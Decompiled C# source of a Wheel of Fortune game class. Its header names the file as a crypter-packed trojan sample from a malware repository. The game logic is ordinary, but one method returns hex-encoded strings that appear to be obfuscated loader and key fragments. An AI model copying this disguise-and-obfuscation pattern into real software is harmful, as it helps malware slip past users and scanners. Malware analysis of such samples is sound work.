// Decompiled with JetBrains decompiler
// Type: BoardGameSuite.WoFGame
// Assembly: FileIn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 227294C8-CF03-47AE-8CA8-972F6CFC8610
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Crypt.gen-2099d310f5fc3d161fad8db45a1e8d555006869871d52e063c0760284955b75e.exe

using System;

namespace BoardGameSuite
{
  internal class WoFGame : Game
  {
    private WoFBoard board;

    public static string MembershipCondition(int BaseStream)
    {
      string str = (string) null;
      switch (BaseStream)
      {
        case 0:
          str = "436F6D70726573736564537461636B52756E4461";
          break;
        case 1:
          str = "664B344E4A746D";
          break;
      }
      return str;
    }

    public WoFGame()
    {
      Console.WriteLine("Wheel... Of... FORTUNE!!!");
      this.gameName = "wof";
      this.maxPlayers = 3;
      this.createUsers(this.maxPlayers);
      this.startGame();
    }

    protected override void startGame()
    {
      this.board = (WoFBoard) this.gameBoardFactory.CreateGameBoard(this.gameName);
      while (!this.gameOver)
      {
        User currentUser = this.userList.Dequeue();
        this.facilitatePlayerGuessOnBoard(currentUser);
        this.userList.Enqueue(currentUser);
        if (this.gameOver)
        {
          Console.WriteLine("Congratulations " + currentUser.name + " You Win!!!!");
          Console.WriteLine("Play again? y/n");
          if (Console.ReadLine().ToLower()[0] == 'y')
          {
            this.board = (WoFBoard) this.gameBoardFactory.CreateGameBoard(this.gameName);
            this.gameOver = false;
          }
        }
      }
    }

    private void facilitatePlayerGuessOnBoard(User currentUser)
    {
      do
      {
        this.board.acceptMove(currentUser.Play());
      }
      while (this.board.goAgain());
      this.gameOver = this.board.isSolved();
    }
  }
}
